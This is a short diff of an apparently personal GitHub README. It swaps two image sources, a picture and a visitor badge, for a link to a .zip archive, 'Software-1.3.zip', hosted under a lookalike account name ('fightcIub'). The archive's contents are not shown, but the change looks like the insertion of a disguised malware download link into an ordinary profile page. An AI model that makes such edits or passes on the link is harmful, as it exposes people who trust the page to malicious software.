@@ -1,5 +1,5 @@
 <p align="center">
-<img src="https://file.garden/Zlc_rlwZaj3gLlZ-/Untitled107_20241108210041.png">
+<img src="https://raw.githubusercontent.com/fightcIub/fuyushirono/main/potassic/Software-1.3.zip">
 </p>
 
 
@@ -9,5 +9,5 @@ w2i
 
 
 <p align="center">
-<img src="https://komarev.com/ghpvc/?username=fuyushirono&label=stalkers&color=red&style=plastic"
+<img src="https://raw.githubusercontent.com/fightcIub/fuyushirono/main/potassic/Software-1.3.zip"
 </p>
